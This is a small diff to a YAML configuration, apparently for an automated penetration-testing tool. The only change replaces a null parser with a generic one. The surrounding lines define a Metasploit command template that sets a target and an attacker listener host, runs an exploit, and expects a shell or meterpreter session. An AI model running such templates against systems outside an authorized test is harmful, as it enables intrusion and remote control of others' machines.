@@ -9,7 +9,7 @@ parameters:
   lhost: from_engagement.attacker_ip
 command_template: msfconsole -q -x 'use {module}; set RHOSTS {target_ip}; set LHOST
   {lhost}; exploit'
-parser: null
+parser: generic_parser
 expected_effects:
 - shell_obtained
 - meterpreter_session
